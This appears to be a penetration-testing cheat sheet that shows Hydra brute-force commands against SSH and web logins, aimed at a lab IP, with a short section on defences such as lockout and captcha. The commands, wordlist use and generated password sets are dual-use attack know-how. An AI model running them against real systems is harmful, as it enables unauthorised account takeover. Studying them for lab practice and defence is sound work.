## BruteForce ssh, web login

```sh
p: password
l: username
L: path to list of username candidates 
P: path to list of password candidates
M: path to Ip list

hydra -l <username> -p <password> <ip> <service> -o <file.txt>
hydra -l <username> -p <password> ssh://<ip>
hydra -l <username> -p <password> <ip> <service> -s <port>
hydra -l <username> -p <password> -M <host_file.txt> <service>
hydra -C <combinations.txt> <ip> <service>


hydra -l molly -p butterfly 10.10.137.76 ssh
hydra -L users.txt -p butterfly 10.10.137.76 ssh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 1010.137.76 ssh

# hydra can generate the passwords for you. No need to generate them separately if you will be using brute force:
hydra -l user_name -V -x 4:4:aA1 ip_address ssh
#-V means verbose, -x 4:4:aA1 means min is 4 letters, max is 4 letters. List of letters is a-z denoted by a, A-Z denoted by A, 0-9 denoted by 1. You can add other characters like %_-+/
#You need to wrap apostrophes around the -x option if you add special characters like space, ^,&,* or ":
hydra -t 128 -l user_name -V -x '4:4:aA1"@#$!()=`~?><;:%^&*_-+/,.\ ' localhost ssh
```

- combinations.text

```sh
username1:password1
username2:password2
username3:password3
```

## How to Defend Against Hydra

The clear solution to help you defend against brute-force attacks is to **set strong passwords**. The stronger a password is, the harder it is to apply brute-force techniques.

We can also enforce password policies to **change passwords every few weeks**. Unfortunately, many individuals and businesses use the same passwords for years. This makes them easy targets for brute-force attacks.

Another way to prevent network-based brute-forcing is to **limit authorization attempts**. Brute-force attacks do not work if we lock accounts after a few failed login attempts. This is common in apps like Google and Facebook that lock your account if you fail a few login attempts.

Finally, tools like **re-captcha** can be a great way to prevent brute-force attacks. Automation tools like Hydra cannot solve captchas like a real human being.